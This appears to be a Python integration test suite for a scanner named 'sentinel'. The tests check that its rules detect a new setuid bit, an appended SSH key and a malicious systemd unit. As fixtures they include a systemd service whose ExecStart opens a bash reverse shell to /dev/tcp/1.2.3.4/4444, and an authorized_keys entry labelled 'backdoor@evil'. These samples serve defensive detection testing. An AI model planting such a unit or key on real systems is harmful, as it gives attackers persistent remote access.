"""Test d'intégration : les 3 règles V4 (SIG-0017/0018/0019) se déclenchent
quand on scanne un dossier qui a été modifié par rapport à sa baseline."""

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]


class TestV4EndToEnd(unittest.TestCase):
    @unittest.skipUnless(os.name != "nt", "le bit setuid n'existe pas sur Windows")
    def test_suid_change_is_detected(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            tool = td / "tool"
            tool.write_text("#!/bin/sh\n")
            tool.chmod(0o755)
            baseline = Path(td) / "b.json"
            subprocess.run(
                [sys.executable, "-m", "sentinel", "baseline", str(td), "--out", str(baseline)],
                cwd=ROOT,
                check=True,
                capture_output=True,
            )
            tool.chmod(0o4755)
            r = subprocess.run(
                [
                    sys.executable,
                    "-m",
                    "sentinel",
                    "scan",
                    str(td),
                    "--baseline",
                    str(baseline),
                    "--format",
                    "json",
                ],
                cwd=ROOT,
                check=False,
                capture_output=True,
                text=True,
            )
            data = json.loads(r.stdout)
            sigs = {f["rule_id"] for f in data["findings"]}
            self.assertIn("SIG-0018", sigs)

    def test_authorized_keys_not_embedded_and_sig0019_announced(self) -> None:
        """Baseline en clair : la clé n'est pas dans le JSON, SIG-0019 est annoncée."""
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            ak = td / "authorized_keys"
            ak.write_text("ssh-ed25519 AAAAAAAA initial@host\n")
            baseline = Path(td) / "b.json"
            subprocess.run(
                [sys.executable, "-m", "sentinel", "baseline", str(td), "--out", str(baseline)],
                cwd=ROOT,
                check=True,
                capture_output=True,
            )
            stored = baseline.read_text()
            self.assertNotIn("AAAAAAAA", stored)
            self.assertNotIn("ssh-ed25519", stored)
            ak.write_text(ak.read_text() + "ssh-ed25519 BBBBBBBB backdoor@evil\n")
            r = subprocess.run(
                [
                    sys.executable,
                    "-m",
                    "sentinel",
                    "scan",
                    str(td),
                    "--baseline",
                    str(baseline),
                    "--format",
                    "json",
                ],
                cwd=ROOT,
                check=False,
                capture_output=True,
                text=True,
            )
            data = json.loads(r.stdout)
            sigs = {f["rule_id"] for f in data["findings"]}
            self.assertIn("SIG-0007", sigs)
            self.assertNotIn("SIG-0019", sigs)
            self.assertIn("SIG-0019", r.stderr)

    def test_malicious_systemd_unit_is_detected(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            td = Path(td)
            svc_dir = td / "etc/systemd/system"
            svc_dir.mkdir(parents=True)
            (svc_dir / "backdoor.service").write_text(
                "[Service]\nExecStart=/bin/bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n"
            )
            r = subprocess.run(
                [sys.executable, "-m", "sentinel", "scan", str(td), "--format", "json"],
                cwd=ROOT,
                check=False,
                capture_output=True,
                text=True,
            )
            data = json.loads(r.stdout)
            sigs = {f["rule_id"] for f in data["findings"]}
            self.assertIn("SIG-0017", sigs)


if __name__ == "__main__":
    unittest.main()
